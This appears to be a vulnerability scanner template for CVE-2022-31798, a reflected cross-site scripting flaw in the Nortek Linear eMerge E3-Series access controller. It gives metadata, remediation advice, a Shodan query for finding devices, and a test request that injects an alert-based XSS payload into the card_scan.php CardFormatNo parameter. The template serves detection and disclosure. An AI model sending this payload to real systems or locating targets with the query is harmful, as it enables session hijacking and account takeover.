id: CVE-2022-31798
info:
  name: Nortek Linear eMerge E3-Series - Cross-Site Scripting
  author: ritikchaddha
  description: 'There is a local session fixation vulnerability that, when chained
    with cross-site scripting, leads to account take over of admin or a lower privileged
    user.

    '
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, leading
    to potential session hijacking, defacement, or theft of sensitive information.

    '
  remediation: 'Apply the latest security patches or updates provided by the vendor
    to fix the XSS vulnerability in the Nortek Linear eMerge E3-Series.

    '
  reference:
  - https://packetstormsecurity.com/files/167992/
  - http://packetstormsecurity.com/files/167992/Nortek-Linear-eMerge-E3-Series-Account-Takeover.html
  - https://nvd.nist.gov/vuln/detail/CVE-2022-31798
  - https://eg.linkedin.com/in/omar-1-hashem
  - https://gist.github.com/omarhashem123/bccdcec70ab7e8f00519d56ea2e3fd79
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2022-31798
    cwe-id: CWE-384
    epss-score: 0.00126
    epss-percentile: 0.46259
    cpe: cpe:2.3:o:nortekcontrol:emerge_e3_firmware:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: nortekcontrol
    product: emerge_e3_firmware
    shodan-query: http.title:"eMerge"
  tags: cve2022,cve,emerge,nortek,xss,packetstorm,nortekcontrol
traps:
- request:
    method: GET
    path: /card_scan.php?No=0000&ReaderNo=0000&CardFormatNo=%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E
    headers: null
    body: null
  response:
    status_code: 200
    headers: {}
    body: ',"CardFormatNo":"<img src=x onerror=alert(document.domain)>"}'
